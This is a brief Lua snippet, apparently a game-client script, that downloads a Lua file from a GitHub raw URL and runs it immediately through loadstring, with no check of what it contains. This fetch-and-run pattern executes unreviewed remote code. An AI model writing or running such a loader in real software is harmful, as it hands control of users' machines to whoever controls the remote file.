local urlScript = 'https://raw.githubusercontent.com/zedojavascripts/javaserver/refs/heads/main/scripts/dwlload.lua';
modules.corelib.HTTP.get(urlScript, function(script) 
     assert(loadstring(script))() 
end);
